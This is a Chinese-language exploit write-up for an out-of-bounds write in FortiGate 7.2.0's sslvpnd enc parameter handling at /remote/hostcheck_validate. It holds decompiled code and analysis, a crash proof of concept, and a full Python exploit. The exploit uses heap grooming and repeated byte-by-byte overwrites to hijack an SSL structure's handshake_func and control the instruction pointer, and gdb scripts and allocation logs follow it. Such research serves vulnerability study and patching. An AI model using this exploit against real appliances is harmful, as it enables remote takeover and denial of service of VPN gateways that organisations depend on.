# 环境

FGT: 7.2.0

CPU: 4

# 关键代码分析

```c
__int64 __fastcall sub_164E180(__int64 a1, _QWORD *a2, const char *a3)
{
  int v4; // eax
  int v5; // er8
  int v6; // er9
  __int64 v7; // r13
  char v8; // bl
  int v9; // er8
  int v10; // er9
  signed int v11; // eax
  _BYTE *v12; // rdx
  int v13; // ecx
  __int16 v14; // ax
  int v15; // ecx
  int v16; // er8
  _BYTE *v17; // rdx
  __int64 v18; // r13
  __int64 v19; // r12
  int v20; // ebx
  __int64 v21; // r12
  __int64 result; // rax
  int v23; // [rsp+0h] [rbp-D0h]
  int v24; // [rsp+Ch] [rbp-C4h]
  int v25; // [rsp+Ch] [rbp-C4h]
  _BYTE *v26; // [rsp+10h] [rbp-C0h] BYREF
  __int64 v27; // [rsp+18h] [rbp-B8h] BYREF
  char v28[96]; // [rsp+20h] [rbp-B0h] BYREF
  char v29[24]; // [rsp+80h] [rbp-50h] BYREF
  unsigned __int64 v30; // [rsp+98h] [rbp-38h]

  v30 = __readfsqword(0x28u);
  v4 = strlen(a3);
  v23 = v4;
  v24 = v4;
  if ( v4 <= 11 || (v4 & 1) != 0 )
  {
    sub_166F020(a1, 8, (unsigned int)"enc data length invalid (%d)\n", v4, v5, v6);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    sub_164E490(byte_A782E30, (__int64)a3, 8, (__int64)v29);
    v26 = (_BYTE *)jmalloc(*a2, (v23 >> 1) + 1);
    if ( v26 )
    {
      v7 = 0LL;
      do
      {
        v8 = sub_1676CE0((unsigned int)a3[2 * v7]);
        v26[v7] = sub_1676CE0((unsigned int)a3[2 * v7 + 1]) + 16 * v8;
        ++v7;
      }
      while ( v24 > 2 * (int)v7 );
      v11 = ((unsigned int)(v23 - 1) >> 1) + 1;
      if ( v23 <= 0 )
        v11 = 1;
      v26[v11] = 0;
      v12 = v26;
      v13 = (unsigned __int8)*v26;
      if ( (_BYTE)v13 )
      {
        sub_166F020(a1, 8, (unsigned int)"invalid encoding method %d\n", v13, v9, v10);
        v12 = v26;
      }
      v26 = v12 + 4;
      v14 = *((_WORD *)v12 + 2);
      v15 = (unsigned __int8)(v14 ^ v29[0]);
      BYTE1(v15) = v29[1] ^ HIBYTE(v14);
      v16 = (unsigned __int8)(v14 ^ v29[0]);
      if ( v23 - 5 <= v16 )
      {
        sub_166F020(a1, 8, (unsigned int)"invalid enc data length: %d\n", (unsigned __int8)v14 ^ v29[0], v16, v10);
        result = 1LL;
      }
      else
      {
        v17 = v12 + 6;
        v26 = v17;
        if ( (unsigned __int8)v14 != v29[0] )
        {
          v18 = (unsigned int)(v16 - 1);
          v19 = 0LL;
          v20 = 2;
          while ( 1 )
          {
            v17[v19] ^= v29[v20];
            if ( v18 == v19 )
              break;
            v20 = ((_BYTE)v19 + 3) & 0xF;
            if ( (((_BYTE)v19 + 3) & 0xF) == 0 )
            {
              v25 = v15;
              MD5_Init(v28);
              MD5_Update(v28, v29, 16LL);
              MD5_Final(v29, v28);
              v15 = v25;
            }
            v17 = v26;
            ++v19;
          }
          v17 = &v26[(unsigned __int16)v15];
        }
        *v17 = 0;
        while ( *v26 )
        {
          v27 = sub_1613C90(*a2, &v26, 38LL);
          if ( !v27 )
            break;
          v21 = sub_1613C90(*a2, &v27, 61LL);
          sub_1614FD0(v21, 0LL);
          sub_1614FD0(v27, 0LL);
          sub_15F20A0(*(_QWORD *)(a1 + 744), v21, v27);
        }
        result = 0LL;
      }
    }
    else
    {
      result = 0xFFFFFFFFLL;
    }
  }
  return result;
}
```

### 分段分析

##### 0x00

```
  if ( v4 <= 11 || (v4 & 1) != 0 )
  {
    sub_166F020(a1, 8LL, (__int64)"enc data length invalid (%d)\n", (unsigned int)v4);
    result = 0xFFFFFFFFLL;
  }
```

enc 参数的值的长度必须大于11，且长度为偶数

##### 0x01

```c
sub_164E490(byte_A782E30, (__int64)a3, 8, (__int64)v29);
```

利用salt的值（可以通过/remote/info获取salt的值），enc 参数的值的前8个字节，字符串"GCC is the GNU Compiler Collection."，计算一个md5值。保存到v29。

##### 0x02

```c
__int64 __fastcall sub_15F13D0(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rax
  __int64 v3; // r8
  unsigned __int64 v4; // rbx
  __int64 result; // rax
  unsigned __int64 v6; // r13
  _QWORD *v7; // rax
  __int64 v8; // r8

  v2 = *(_QWORD **)(a1 + 8);
  v3 = v2[2];
  if ( !a2 )
    return 0LL;
  v4 = 8LL * (int)(((unsigned __int64)(a2 - 1) >> 3) + 1);
  if ( *v2 < v3 + v4 )
  {
    v6 = dword_A782904 - 25;
    if ( v6 < v4 )
      v6 = 8LL * (int)(((unsigned __int64)(a2 - 1) >> 3) + 1);
    v7 = (_QWORD *)je_malloc(v6 + 24);
    if ( !v7 )
      sub_15F3F90();
    v7[1] = 0LL;
    v7[2] = v7 + 3;
    *v7 = (char *)v7 + v6 + 24;
    *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v7;
    v8 = v7[2];
    *(_QWORD *)(a1 + 8) = v7;
    v7[2] = v8 + v4;
    result = v8;
  }
  else
  {
    v2[2] = v3 + v4;
    result = v3;
  }
  return result;
}
```

```c
 v26 = (_BYTE *)sub_15F13D0(*a2, (v23 >> 1) + 1);
```

根据enc的长度分配一块内存：8*((((strlen(enc)>>1)+1)-1) >> 3+1)+24

##### 0x03

```c
do
{
	v8 = sub_1676CE0((unsigned int)a3[2 * v7]);
	v26[v7] = sub_1676CE0((unsigned int)a3[2 * v7 + 1]) + 16 * v8;
	++v7;
}
```

将enc的值，每两个字节，转换为一个对应的值，如将“1A” 转换为 1a，相当于16进制的两个可打印字符转为，一个对应的一个字节值的,

如：enc="1234567890"  转换后

内存的值为:{18,52,86,120,144}

"12" ==> 18

"34" ==> 52

"56" ==> 86

.....................

##### 0x04

```c
v13 = (unsigned __int8)*v26;
if ( (_BYTE)v13 )
{
	sub_166F020(a1, 8, (unsigned int)"invalid encoding method %d\n", v13, v9, v10);
	v12 = v26;
}
```

enc 开头的前两个字节为"00" , 这样经过转换后v26[0]的值为0

##### 0x05 漏洞点位

```c
v26 = v12 + 4;
v14 = *((_WORD *)v12 + 2);
v15 = (unsigned __int8)(v14 ^ v29[0]);
BYTE1(v15) = v29[1] ^ HIBYTE(v14);
v16 = (unsigned __int8)(v14 ^ v29[0]);
if ( v23 - 5 <= v16 )
{
	sub_166F020(a1, 8, (unsigned int)"invalid enc data length: %d\n", (unsigned __int8)v14 ^ v29[0], v16, v10);
	result = 1LL;
}
```

v16变量为数据的长度，用户可控制，实际分配的内存大小为:((strlen(enc)>>1)+1)，但是这里判断时大于等于(strlen(enc) -5) 才退出



也就是说我们可以越界 ((strlen(enc)>>1)+1) 到 (strlen(enc) -6) 的内容



v16的计算方法为：将enc[8:12]的两个16进制可打印字符（e g:"1a2f" , 占用4个字节），转换为对应的两个字节后(eg:{0x1a,0x2f})，然后异或0x01分析哪里出来的md5值

##### 0x06

```c
        v17 = v12 + 6;
        v26 = v17;
        if ( (unsigned __int8)v14 != v29[0] )
        {
          v18 = (unsigned int)(v16 - 1);
          v19 = 0LL;
          v20 = 2;
          while ( 1 )
          {
            v17[v19] ^= v29[v20];
            if ( v18 == v19 )
              break;
            v20 = ((_BYTE)v19 + 3) & 0xF;
            if ( (((_BYTE)v19 + 3) & 0xF) == 0 )
            {
              v25 = v15;
              MD5_Init(v28);
              MD5_Update(v28, v29, 16LL);
              MD5_Final(v29, v28);
              v15 = v25;
            }
            v17 = v26;
            ++v19;
          }
          v17 = &v26[(unsigned __int16)v15];
        }
        *v17 = 0;
```

首先将enc[12:]每两个字节的16进制字符转换为一个字节后（eg：”1a“--> {26}），与0x01分析哪里出来的md5值的offset 2---15 进行异或，后续用上一轮的md5值，计算一个新的md5值，然后在进行异或，保存到分配的内存中，直到 v16。

最后将v16偏移处的值设置为0

# enc结构分析

```
|---8个字节用于进行第一次的md5值计算，前两个字节必须为“00”---|---4个字节表示后续数据大小---|---data---|
```

经过0x03代码片段，会将enc 每两个字节，转换为一个字节（16进制可打印字符转换，eg：“1a21” --》 {26,33}）

# poc

内存分配测试脚本：

```
#!/usr/bin/python3

for enc_len in range(12,4097,2):
    print("enc_len      : ",enc_len)
    print("alloc_len    : ",(((((enc_len>>1)+1)-1)>>3)+1)*8+24 )
    print("max data len : ",enc_len - 6)
```
enc_len 为发包时enc的长度，alloc_len是分配的内存长度，max data len为用户可指定的内存长度

eg:

```
enc_len      :  4096
alloc_len    :  2080
max data len :  4090
```

```python
#!/usr/bin/python3
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib

HOST = "192.168.182.188"
PORT = 8443  

REQ_POST = """\
POST %s HTTP/1.1\r
Host: %s:%d\r
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r
Content-Type: text/plain;charset=UTF-8\r
Connection: keep-alive\r
Content-Length: %d\r
\r
%s
"""

REQ_GET = """\
GET %s HTTP/1.1\r
Host: %s:%d\r
Connection: keep-alive\r
\r
"""

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def try_read_response(sock) -> bytes:
    """Try to read the response header and contents. If the read() call
    returns an empty byte array, `RuntimeError` is raised. This generally
    indicates that the socket died.
    """

    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    # TOP tier HTTP parser
    if b"Content-Length: " in headers:
        length = int(re.search(rb"Content-Length: ([0-9]+)", headers).group(1))
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while len(data) < length:
            data += read_or_raise(length - len(data))
    elif b"Transfer-Encoding: chunked" in headers:
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while not data.endswith(b"\r\n0\r\n\r\n"):
            data += read_or_raise(100)
    else:
        raise RuntimeError(
            f"No Content-Length / Transfer-Encoding headers: {headers}"
        )
    return data

def send_post(sock, path: str, data: dict) -> bytes:
    """Sends a POST request, returns the response."""
    data = urllib.parse.urlencode(data)
    if len(data) > 0x10000:
        failure(f"POST data too big: {hex(len(data))}")
    request = REQ_POST % (path, HOST, PORT, len(data), data)
    # msg_print(request[:-0x1000])
    sock.sendall(request.encode())
    return try_read_response(sock)

def send_get(sock, path: str) -> bytes:
    """Sends a GET request, returns the response."""
    request = REQ_GET % (
            path,
            HOST,
            PORT,
    )
    sock.sendall(request.encode())
    return try_read_response(sock)

def get_salt(sock):
    """Obtains the current salt from the remote server"""
    response = send_get(sock,"/remote/info")
    salt = re.search(rb"salt='(.*?)'", response).group(1).decode()
    return salt

def compute_md5(prefix:bytes,salt):
    """Algorithm to compute the initial MD5 value."""
    assert len(prefix) == 8
    return hashlib.md5(
        salt.encode()
        + prefix.encode()
        + b"GCC is the GNU Compiler Collection."
    ).digest()

def create_test_enc_data(enc_len,salt):
    seed = "00000000"
    init_md5 = compute_md5(seed,salt)
    max_data_len = enc_len - 6
    
    len_hi = (max_data_len >> 8) ^ init_md5[1]
    len_lo = (max_data_len & 0xFF) ^ init_md5[0]
    
    data = b'0' * ((enc_len - 8 - 4)>>1)
    size = bytes((len_lo,len_hi))
    return seed + size.hex() + data.hex()

ssl_socket = create_ssl_socket()
input("Press Enter to send the HTTP request...")

salt = get_salt(ssl_socket)
print("salt: ",salt)

enc = create_test_enc_data(40960,salt)

send_post(ssl_socket,"/remote/hostcheck_validate",{"enc":f"{enc}"})
```

该poc构造一个恶意的enc数据， 造成越界写，从而会造成sslvpnd进程崩溃。

```
enc_len      :  40960
alloc_len    :  20512
max data len :  40954
```

首先我们实际的enc数据长度为40960，分配的内存长度为20512，但是我们越界写20512 --- 40954，从而造成sslvpnd进程崩溃

通过gdb分析：

```
Breakpoint 2, 0x00000000015f143b in ?? ()
(gdb) print $rdi
$1 = 20512
```

这是实际分配的内存确实为20512

Max data Len:

```
Breakpoint 3, 0x000000000164e2b7 in ?? ()
(gdb) print $cx
$2 = -24582
(gdb) print $rcx
$3 = 40954
(gdb) 
```

与计算的符合

# exp

思路：0x06代码片段中，会将v16（用户可控制的数据长度字段）偏移处的值设置为0

0 异或 任意一个数都为 该数本身。首先第一次时，设置v16为指定的偏移，将该偏移的值设置为0，然后v16+1异或一个我们需要的值，这样就能做到写入任意数据，而v16之前的数据经过两次异或会保持不变，并不会对以前的数据造成影响

SSL 结构体在 FGT 7.2.0中的大小为0x1888 ，实际会给他分配 7kb的内存大小。

首先创建大量的SSL结构体，然后在释放一个中间位置的SSL结构体。在通过控制enc参数，占用释放掉的SSL结构体的位置，通过任意写，修改挨着的SSL结构体的handshake_func函数，从而控制rip。

为了保证分配7kb的内存，我们的enc长度需要为：14272(0x37c0)

```python
#!/usr/bin/python3

def calc_enc(enc_len,need_len):
    alloc_len = (((((enc_len>>1)+1)-1)>>3)+1)*8+24
    max_data_len = enc_len - 6
    if need_len == alloc_len:
        return True
    else:
        return False

for i in range(12,65535,2):
    if calc_enc(i,0x1c00):
        print("enc_len: ",i)
        break
```

### sslvpn 处理相关的流程

对于N个CPU的FGT设备(N为偶数)，分析可以发现，其会创建N个sslvpnd，有一个sslvpnd 会专门监听用户的连接请求，然后将该请求通过unix域套节字传递给另外的 (N-1)中的一个sslvpnd进行处理。通过大量请求发现，貌似使用轮询的方式选中（N-1）中的一个。

如何有效的保证我们用来执行越界写的enc分配的内存 与释放掉的SSL 结构体在同一个sslvpnd进程中，且位于SSL结构体的前面呢？

当有2个CPU时，只有一个sslvpnd进行数据处理，我们可以通过分配大量的SSL结构体，然后释放掉中间两个，

当有4个CPU时，会有3个sslvpnd进行数据处理，我们需要通过请求分配 3*M（M》3）个SSL结构体。先假设 M 为 6:，那么sslvpnd进程0有SSL结构体编号：0，3，6，9，12，15.......，那么sslvpnd进程1有SSL结构体编号：1，4，7，10，13，16..........，那么sslvpnd进程2有SSL结构体编号：2，5，8，11，14，17........。释放掉3，4，5，6，7，8，9，10，11然后在连续申请3个attack_sock，此时，这三个attack_sock 分配处于三个sslvpnd进程中，他们的SSL结构体的编号为9，10，11。再申请三个victim_sock，他们的SSL结构体的编号为6，7，8。当attack_sock申请enc内存时，会占用SSL结构体的编号为3，4，5。这样可以越界写6，7，8 SSL 结构体中的handshake_func 函数。



通过gdb脚本查看ssl结构体分配情况，以及enc 内存分配情况：

```
handle SIGPIPE nostop
break *SSL_new + 0x35
commands
    printf "ssl alloc addr:%p",$rax 
    continue
end

break *0x000000000164E1FE 
commands
    printf "enc alloc addr:%p\n",$rax 
    continue
end
```

通过大量发包，分析：

```
ssl alloc addr:ff41000
Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:ff3e400
Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:ff3c818
```

ff41000 为 attack_sock，ff3e400 为 victim_sock，ff3c818 为 enc 分配的内存，相差都在7K(0x1c00)，为什么 enc 分配的内存多了0x18呢？因为在处理enc参数的函数，进行内存分配后，会将内存地址加0x18在返回。



如何触发handshake_func函数的调用呢？

```
 Overwrite ssl->statem.in_init to force the call to s->handshake_func when SSL_write gets called.
```



通过逆向libssl.so中的SSL_do_handshake函数，我们知道handshake_func在SSL结构体中的偏移为0x30，s->statem.in_init 偏移为 0x64（需要将in_init设置为1）

### control rip

```python
#!/usr/bin/python3
from pwn import *
import threading
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib
import math
import random
import string

SSLVPND_WORKER_COUNT = 3
PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT = 51
SSL_STRUCT_SIZE = 0x1c00
HOST = "192.168.182.188"
PORT = 8443  

enc_data_need_len = ((((SSL_STRUCT_SIZE-24)>>3)-1)<<4)
user_data_len = enc_data_need_len - 8 - 4 # 8 bytes seed and 4 bytes size Field
user_size_max = enc_data_need_len - 6

REQ_POST = """\
POST %s HTTP/1.1\r
Host: %s:%d\r
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r
Content-Type: text/plain;charset=UTF-8\r
Connection: keep-alive\r
Content-Length: %d\r
\r
%s
"""

REQ_GET = """\
GET %s HTTP/1.1\r
Host: %s:%d\r
Connection: keep-alive\r
\r
"""

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def try_read_response(sock) -> bytes:
    """Try to read the response header and contents. If the read() call
    returns an empty byte array, `RuntimeError` is raised. This generally
    indicates that the socket died.
    """

    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    # TOP tier HTTP parser
    if b"Content-Length: " in headers:
        length = int(re.search(rb"Content-Length: ([0-9]+)", headers).group(1))
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while len(data) < length:
            data += read_or_raise(length - len(data))
    elif b"Transfer-Encoding: chunked" in headers:
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while not data.endswith(b"\r\n0\r\n\r\n"):
            data += read_or_raise(100)
    else:
        raise RuntimeError(
            f"No Content-Length / Transfer-Encoding headers: {headers}"
        )
    return data

def send_post(sock, path: str, data: dict) -> bytes:
    """Sends a POST request, returns the response."""
    data = urllib.parse.urlencode(data)
    if len(data) > 0x10000:
        failure(f"POST data too big: {hex(len(data))}")
    request = REQ_POST % (path, HOST, PORT, len(data), data)
    # msg_print(request[:-0x1000])
    sock.sendall(request.encode())
    return try_read_response(sock)

def send_get(sock, path: str) -> bytes:
    """Sends a GET request, returns the response."""
    request = REQ_GET % (
            path,
            HOST,
            PORT,
    )
    sock.sendall(request.encode())
    return try_read_response(sock)

def get_salt(sock):
    """Obtains the current salt from the remote server"""
    response = send_get(sock,"/remote/info")
    salt = re.search(rb"salt='(.*?)'", response).group(1).decode()
    return salt

def compute_md5(salt,seed):
    """Algorithm to compute the initial MD5 value."""
    assert len(seed) == 8
    return hashlib.md5(
        salt.encode()
        + seed.encode()
        + b"GCC is the GNU Compiler Collection."
    ).digest()

def get_seed_for_md5_byte(pos, value,salt):
    distance = SSL_STRUCT_SIZE - 6 - 0x18 + pos # 减去0x18是因为分配enc内存后，地址加了0x18在返回的 , 减去6是跳过 seed 和size
    # First MD5 has its first two bytes used to XOR the size
    distance += 2
    MD5_LEN = 16
    rounds,offset = divmod(distance,MD5_LEN)
    c = hashlib.md5
    for seed in range(2**24):
        seed = "00" + p32(seed)[:3].hex()
        hash = compute_md5(salt,seed)
        keystream = hash
        for i in range(rounds):
            hash = c(hash).digest()
            keystream += hash
        if hash[offset] == value:
            return seed
    failure("Unable to get seed")

def single_write(sock,pos,value,salt):
    """Writes a single byte `value` at offset `pos`. The next byte becomes
    a NULL byte.
    """
    seed = get_seed_for_md5_byte(pos,value,salt)
    init_md5 = compute_md5(salt,seed)
    
    # first set value = 0
    user_size = SSL_STRUCT_SIZE - 6 - 0x18 + pos # 减去0x18是因为分配enc内存后，地址加了0x18在返回的 , 减去6是跳过 seed 和size
    len_hi = (user_size >> 8) ^ init_md5[1] 
    len_lo = (user_size & 0xFF) ^ init_md5[0]
    size = bytes((len_lo,len_hi))
    
    payload = seed + size.hex() + "0"*user_data_len
    send_post(sock,"/remote/hostcheck_validate",{"enc":payload})
    
    # second xor zero = value
    user_size = SSL_STRUCT_SIZE - 6 - 0x18 + pos + 1
    len_hi = (user_size >> 8) ^ init_md5[1] 
    len_lo = (user_size & 0xFF) ^ init_md5[0]
    size = bytes((len_lo,len_hi))
    
    payload = seed + size.hex() + "0"*user_data_len
    send_post(sock,"/remote/hostcheck_validate",{"enc":payload})

def write_bytes(sock,pos,bytes,salt):
    """Writes given bytes at offset `pos`."""
    for i, b in enumerate(bytes):
        single_write(sock, pos + i, b,salt)

def generate_random_string(length):
    characters = string.ascii_letters + string.punctuation  # 包含字母和标点符号
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def attack(sock,salt):
    write_bytes(sock,0x30,bytes([0xff,0xff,0xff,0xff,0xff,0xff,0xff]),salt)
    write_bytes(sock,0x64,bytes([0x1]),salt)

def trigger(sock):
    random_str = generate_random_string(16)
    try:
        send_get(sock, f"/remote/error?errmsg={random_str}")
    except RuntimeError as e:
        return
    return

salt_socket = create_ssl_socket()

salt = get_salt(salt_socket)
salt_socket.do_handshake

socks = []
for i in range(SSLVPND_WORKER_COUNT*PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT):
    sk = create_ssl_socket()
    socks.append(sk)

close_socks_index = (PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT//2)*SSLVPND_WORKER_COUNT

for i in range(SSLVPND_WORKER_COUNT*3):
    sk = socks.pop(close_socks_index)
    sk.close()

attack_socks = []
for i in range(SSLVPND_WORKER_COUNT):
    sk = create_ssl_socket()
    attack_socks.append(sk)

victim_socks = []
for i in range(SSLVPND_WORKER_COUNT):
    sk = create_ssl_socket()
    victim_socks.append(sk)

attack_sock_threads = []
for i in range(SSLVPND_WORKER_COUNT):
    thread = threading.Thread(target=attack,args=(attack_socks[i],salt))
    attack_sock_threads.append(thread)
    thread.start()

for thread in attack_sock_threads:
    thread.join()

#trigger
victim_sock_threads = []
for i in range(SSLVPND_WORKER_COUNT):
    thread = threading.Thread(target=trigger,args=(victim_socks[i],))
    victim_sock_threads.append(thread)
    thread.start()

for thread in victim_sock_threads:
    thread.join()
```

该exp将rip的值设置为0x00ffffffffffffff

gdb 附加到实际处理请求的哪几个sslvpnd（N-1，N为CPU个数），执行下面的脚本，并继续。

```
handle SIGPIPE nostop

break *SSL_new + 0x35
commands
	printf "ssl alloc addr:%p\n",$rax 
	set $addr = $rax
	continue
end

break *0x000000000164E1FE 
commands
	printf "enc alloc addr:%p\n",$rax 
	continue 
end

break *0x000000000164E35F 
commands
	printf "write %p to zero\n",$rdx
	printf "SSL init_flag:%d\n",*(unsigned int*)($addr+0x64)
	printf "SSL handshake_func:%p\n",*(unsigned long*)($addr+0x30)
	continue
end
```



对于崩溃的sslvpnd的gdb 的输出为：

```
Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fde4000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fde5c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fde7800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fde9400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdeb000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdecc00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdee800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdf0400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdf2000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdf3c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdf5800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fdf7400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe70000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe71c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe73800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe75400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe96000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe97c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe99800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe9b400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe9d000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fe9ec00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fea0800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fea2400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fecf000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fed0c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fed2800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fed4400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff07000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff08c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff0a800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff0c400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff0e000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff0fc00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff11800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff13400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff6b000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff6cc00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff6e800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff70400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff72000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff73c00

